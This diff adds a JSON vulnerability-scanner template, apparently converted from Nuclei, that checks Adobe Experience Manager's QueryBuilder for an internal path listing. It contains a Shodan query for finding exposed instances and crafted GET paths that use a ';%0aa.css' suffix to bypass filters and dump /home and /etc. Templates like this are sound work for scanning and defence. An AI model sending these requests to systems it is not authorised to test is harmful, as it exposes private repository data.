@@ -1,0 +1,144 @@
+{
+  "id": "aem-querybuilder-internal-path-read",
+  "name": "AEM QueryBuilder Internal Path Read",
+  "author": "DhiyaneshDk",
+  "severity": "MEDIUM",
+  "description": "AEM QueryBuilder is vulnerable to LFI.",
+  "references": [
+    "https://speakerdeck.com/0ang3el/aem-hacker-approaching-adobe-experience-manager-webapps-in-bug-bounty-programs?slide\u003d91"
+  ],
+  "tags": [
+    "aem",
+    "misconfig"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {
+    "shodan": "http.component:\"Adobe Experience Manager\""
+  },
+  "variables": {},
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "method": "GET",
+      "path": "{{BaseURL}}/bin/querybuilder.json.;%0aa.css?path\u003d/home\u0026p.hits\u003dfull\u0026p.limit\u003d-1",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "STATUS",
+          "values": [
+            "200"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        },
+        {
+          "type": "WORD",
+          "part": "all",
+          "values": [
+            "jcr:path",
+            "success"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": true,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "aem-querybuilder-internal-path-read",
+    "info": {
+      "name": "AEM QueryBuilder Internal Path Read",
+      "author": "DhiyaneshDk",
+      "severity": "medium",
+      "description": "AEM QueryBuilder is vulnerable to LFI.",
+      "reference": [
+        "https://speakerdeck.com/0ang3el/aem-hacker-approaching-adobe-experience-manager-webapps-in-bug-bounty-programs?slide\u003d91"
+      ],
+      "classification": {},
+      "metadata": {
+        "max_request": 4,
+        "shodan_query": "http.component:\"Adobe Experience Manager\""
+      },
+      "tags": "aem,misconfig"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "method": "GET",
+        "redirects": false,
+        "path": [
+          "{{BaseURL}}/bin/querybuilder.json.;%0aa.css?path\u003d/home\u0026p.hits\u003dfull\u0026p.limit\u003d-1",
+          "{{BaseURL}}/bin/querybuilder.json.;%0aa.css?path\u003d/etc\u0026p.hits\u003dfull\u0026p.limit\u003d-1",
+          "{{BaseURL}}/bin/querybuilder.json.css?path\u003d/home\u0026p.hits\u003dfull\u0026p.limit\u003d-1",
+          "{{BaseURL}}/bin/querybuilder.json.css?path\u003d/etc\u0026p.hits\u003dfull\u0026p.limit\u003d-1"
+        ],
+        "skip_variables_check": false,
+        "stop_at_first_match": true,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "matchers_condition": "and",
+        "matchers": [
+          {
+            "type": "status",
+            "status": [
+              200
+            ]
+          },
+          {
+            "type": "word",
+            "negative": false,
+            "part": "all",
+            "words": [
+              "jcr:path",
+              "success"
+            ],
+            "condition": "and",
+            "case_insensitive": false
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
